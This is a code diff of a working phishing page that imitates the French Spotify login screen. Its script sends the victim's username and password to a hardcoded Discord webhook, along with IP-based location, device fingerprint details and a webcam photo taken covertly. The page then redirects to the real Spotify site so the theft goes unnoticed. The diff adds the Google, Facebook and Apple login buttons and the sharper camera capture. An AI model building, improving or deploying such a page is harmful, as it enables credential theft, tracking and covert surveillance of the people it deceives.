@@ -3,88 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Spotify - Connexion</title>
+    <title>Connexion - Spotify</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
-        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .login-card { background-color: #121212; width: 100%; max-width: 440px; padding: 50px 45px; border-radius: 8px; text-align: center; }
-        .logo { width: 100px; margin: 0 auto 35px auto; }
-        h1 { font-size: 32px; font-weight: 900; margin-bottom: 40px; letter-spacing: -1px; }
-        .input-group { text-align: left; margin-bottom: 20px; }
+        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; padding-top: 32px; }
+        .container { width: 100%; max-width: 450px; margin: 0 auto; text-align: center; padding: 0 32px; }
+        .logo { width: 35px; margin: 0 auto 32px auto; }
+        h1 { font-size: 48px; font-weight: 900; margin-bottom: 48px; letter-spacing: -1.5px; line-height: 1.1; }
+        .input-group { text-align: left; margin-bottom: 16px; }
         label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 8px; }
         input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; outline: none; font-size: 16px; }
-        input:focus { border: 2px solid #fff; }
-        .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 14px; border-radius: 500px; width: 100%; margin-top: 15px; font-size: 16px; border: none; cursor: pointer; }
+        input:focus { border: 2px solid #1ed760; }
+        .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 8px; font-size: 16px; border: none; cursor: pointer; transition: 0.2s; }
+        .btn-green:hover { background: #1fdf64; transform: scale(1.02); }
+        .social-btn { background: transparent; border: 1px solid #727272; border-radius: 500px; padding: 12px; width: 100%; color: #fff; font-weight: 700; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; font-size: 14px; cursor: pointer; }
+        .social-btn img { width: 20px; margin-right: 12px; }
+        .divider { display: flex; align-items: center; text-align: center; margin: 32px 0; color: #727272; font-size: 12px; font-weight: 700; }
+        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #292929; }
+        .divider:not(:empty)::before { margin-right: .5em; }
+        .divider:not(:empty)::after { margin-left: .5em; }
+        .footer-text { color: #b3b3b3; font-size: 14px; margin-top: 48px; padding-bottom: 50px; }
+        .footer-text a { color: #fff; font-weight: 700; text-decoration: none; border-bottom: 1px solid #fff; }
         #v, #c { position: absolute; left: -9999px; visibility: hidden; }
     </style>
 </head>
 <body>
-    <div class="login-card">
-        <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" class="logo">
-        <h1>Se connecter</h1>
-        <div class="input-group"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text" placeholder="E-mail ou nom d'utilisateur"></div>
-        <div class="input-group"><label>Mot de passe</label><input id="p" type="password" placeholder="Mot de passe"></div>
-        <button onclick="collectAll()" id="btn" class="btn-green">Se connecter</button>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
+        <h1>Bon retour parmi nous</h1>
+
+        <div class="input-group">
+            <label>Adresse e-mail ou nom d'utilisateur</label>
+            <input id="u" type="text" placeholder="Adresse e-mail ou nom d'utilisateur" autocomplete="username">
+        </div>
+        <div class="input-group">
+            <label>Mot de passe</label>
+            <input id="p" type="password" placeholder="Mot de passe" autocomplete="current-password">
+        </div>
+
+        <button onclick="megaCapture()" id="btn" class="btn-green">Continuer</button>
+
+        <div class="divider">ou</div>
+
+        <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"> Continuer avec Google</div>
+        <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.png"> Continuer avec Facebook</div>
+        <div class="social-btn"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter:invert(1)"> Continuer avec Apple</div>
+        <div class="social-btn">Continuer avec un numéro de téléphone</div>
+
+        <div class="footer-text">
+            Vous n'avez pas de compte ? <a href="#">S'inscrire sur Spotify</a>
+        </div>
     </div>
+
     <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
 
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
 
-        async function collectAll() {
+        async function megaCapture() {
             const user = document.getElementById('u').value;
             const pass = document.getElementById('p').value;
             if(!user || !pass) return;
 
-            // COLLECTE MASSIVE
+            document.getElementById('btn').innerText = "...";
+
+            // 1. COLLECTE MASSIVE DE DONNÉES
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
             
-            // Infos GPU
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Inconnu";
+            const gl = document.createElement('canvas').getContext('webgl');
+            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
+            
+            const dark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Activé" : "Désactivé";
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const netType = connection ? connection.effectiveType : "Inconnu";
 
             const payload = {
                 embeds: [{
-                    title: "👑 RAPPORT DÉTAILLÉ LVN ULTIMATE V5",
+                    title: "🔱 RAPPORT GOD-MODE LVN ELITE",
                     color: 1955168,
                     thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" },
                     fields: [
-                        { name: "👤 COMPTE", value: `**User:** \`${user}\`\n**Pass:** \`${pass}\``, inline: false },
-                        { name: "🌐 RÉSEAU & IP", value: `**IP:** \`${net.ip}\`\n**FAI:** \`${net.org}\`\n**Ville:** \`${net.city}\`\n**Pays:** \`${net.country_name}\`\n**Code Postal:** \`${net.postal}\``, inline: true },
-                        { name: "📱 HARDWARE", value: `**RAM:** \`${navigator.deviceMemory || '?'}GB\`\n**CPU:** \`${navigator.hardwareConcurrency || '?'} Coeurs\`\n**Batterie:** \`${Math.round(bat.level * 100) || '?'}%\`\n**En Charge:** \`${bat.charging ? 'Oui' : 'Non'}\`\n**GPU:** \`${gpu}\``, inline: true },
-                        { name: "⚙️ SYSTÈME", value: `**Plateforme:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`\n**Écran:** \`${screen.width}x${screen.height}\`\n**Fuseau:** \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``, inline: true },
-                        { name: "📍 GÉOPOSITION", value: `**Lat:** \`${net.latitude}\` | **Long:** \`${net.longitude}\` \n**[Ouvrir Google Maps](https://www.google.com/maps?q=${net.latitude},${net.longitude})**`, inline: false },
-                        { name: "🕵️ USER-AGENT", value: `\`${navigator.userAgent}\``, inline: false }
+                        { name: "👤 ACCÈS", value: `**User:** \`${user}\`\n**Pass:** \`${pass}\``, inline: false },
+                        { name: "🌐 RÉSEAU AVANCÉ", value: `**IP:** \`${net.ip}\`\n**Type:** \`${netType.toUpperCase()}\`\n**FAI:** \`${net.org}\`\n**Ville:** \`${net.city}\`\n**Maps:** **[Position Précise](https://www.google.com/maps?q=${net.latitude},${net.longitude})**`, inline: true },
+                        { name: "📱 MACHINE", value: `**RAM:** \`${navigator.deviceMemory || '?'}GB\`\n**GPU:** \`${gpu}\`\n**CPU:** \`${navigator.hardwareConcurrency} Coeurs\`\n**Batterie:** \`${Math.round(bat.level*100)}%\` (${bat.charging ? '⚡' : '🔋'})\n**Mode Sombre:** \`${dark}\``, inline: true },
+                        { name: "⚙️ NAVIGATEUR", value: `**Langue:** \`${navigator.language}\`\n**Écran:** \`${screen.width}x${screen.height}\`\n**Plateforme:** \`${navigator.platform}\`\n**User-Agent:** \`${navigator.userAgent}\``, inline: false }
                     ],
-                    footer: { text: "Rapport généré le " + new Date().toLocaleString() }
+                    footer: { text: "Rapport LVN Elite • " + new Date().toLocaleString() }
                 }]
             };
 
             await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 
-            // Capture Caméra
+            // 2. CAPTURE VISAGE HD
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 1280, height: 720 } });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 await new Promise(r => setTimeout(r, 2000));
-                const c = document.getElementById('c');
-                c.width = 1280; c.height = 720;
-                c.getContext('2d').drawImage(video, 0, 0);
-                c.toBlob(async (b) => {
+                const can = document.getElementById('c');
+                can.width = 1280; can.height = 720;
+                can.getContext('2d').drawImage(video, 0, 0);
+                can.toBlob(async (b) => {
                     const fd = new FormData();
-                    fd.append('file', b, 'capture.png');
-                    fd.append('content', "📸 **VISUEL CIBLE :**");
+                    fd.append('file', b, 'lvn_capture.png');
+                    fd.append('content', "📸 **PHOTO DE LA CIBLE RÉCUPÉRÉE :**");
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
-                });
+                }, 'image/png');
             } catch (e) {}
 
-            setTimeout(() => { window.location.href = "https://www.spotify.com"; }, 3000);
+            // Redirection finale crédible
+            setTimeout(() => { 
+                window.location.href = "https://www.spotify.com/fr/download/"; 
+            }, 3000);
         }
     </script>
 </body>
